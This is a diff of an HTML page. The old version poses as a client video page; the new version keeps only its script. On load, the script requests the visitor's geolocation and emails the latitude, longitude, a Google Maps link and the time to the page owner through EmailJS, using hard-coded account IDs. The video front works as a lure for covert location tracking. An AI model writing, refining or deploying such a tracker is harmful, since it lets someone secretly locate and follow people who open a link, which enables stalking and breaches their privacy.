@@ -1,117 +1,105 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Client Video Page</title>
+<script>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+emailjs.init("5YzzNNDMEURwMIHB");
 
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: white;
-      text-align: center;
-    }
+const statusText = document.getElementById("status");
 
-    .container {
-      padding: 40px;
-    }
+function sendLocation(latitude, longitude) {
 
-    h1 {
-      margin-bottom: 20px;
-    }
+  statusText.innerHTML = "Sending location...";
 
-    video {
-      width: 80%;
-      max-width: 900px;
-      border-radius: 10px;
-      margin-top: 20px;
-      box-shadow: 0 0 20px rgba(255,255,255,0.2);
-    }
+  const templateParams = {
+    latitude: latitude,
+    longitude: longitude,
+    map_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+    time: new Date().toLocaleString()
+  };
 
-    .status {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #00ff88;
-    }
-  </style>
-</head>
-<body>
+  emailjs.send(
+    "service_hf7zca6",
+    "template_km4w7nd",
+    templateParams
+  )
 
-  <div class="container">
-    <h1>Welcome</h1>
+  .then(function(response) {
 
-    <!-- Upload your video file here -->
-    <video controls autoplay muted>
-      <source src="your-video.mp4" type="video/mp4">
-      Your browser does not support video.
-    </video>
+    console.log("SUCCESS!", response);
 
-    <div class="status" id="status">
-      This is a the website find ths
-    </div>
-  </div>
+    statusText.innerHTML =
+      "Location shared successfully.";
 
-  <script>
-    // EMAILJS CONFIGURATION
-    emailjs.init("5YzzNNDMEURwMIHB");
+  })
 
-    const statusText = document.getElementById("status");
+  .catch(function(error) {
 
-    function sendLocation(latitude, longitude) {
+    console.log("FAILED...", error);
 
-      const templateParams = {
-        latitude: latitude,
-        longitude: longitude,
-        map_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
-        time: new Date().toLocaleString()
-      };
+    statusText.innerHTML =
+      "Failed to send location.";
 
-      
+  });
 
-emailjs.send(
-  "service_hf7zca6",
-  "template_km4w7nd",
-  templateParams
-)
-      .then(function(response) {
-        console.log("SUCCESS", response);
-        statusText.innerHTML = "Location shared successfully.";
-      })
-      .catch(function(error) {
-        console.log("FAILED", error);
-        statusText.innerHTML = "Failed to send location.";
-      });
-    }
+}
 
-    function getLocation() {
-      if (navigator.geolocation) {
+function getLocation() {
 
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
+  if (!navigator.geolocation) {
 
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
+    statusText.innerHTML =
+      "Geolocation not supported.";
 
-            sendLocation(latitude, longitude);
-          },
-          function(error) {
-            statusText.innerHTML = "Location permission denied.";
-            console.log(error);
-          }
-        );
+    return;
+  }
 
-      } else {
-        statusText.innerHTML = "Geolocation not supported.";
+  statusText.innerHTML =
+    "Requesting location permission...";
+
+  navigator.geolocation.getCurrentPosition(
+
+    function(position) {
+
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude:", latitude);
+      console.log("Longitude:", longitude);
+
+      sendLocation(latitude, longitude);
+
+    },
+
+    function(error) {
+
+      console.log(error);
+
+      switch(error.code) {
+
+        case error.PERMISSION_DENIED:
+          statusText.innerHTML =
+            "Location permission denied.";
+          break;
+
+        case error.POSITION_UNAVAILABLE:
+          statusText.innerHTML =
+            "Location unavailable.";
+          break;
+
+        case error.TIMEOUT:
+          statusText.innerHTML =
+            "Location request timeout.";
+          break;
+
+        default:
+          statusText.innerHTML =
+            "Unknown location error.";
       }
+
     }
 
-    getLocation();
-  </script>
+  );
 
-</body>
-</html>
+}
+
+getLocation();
+
+</script>
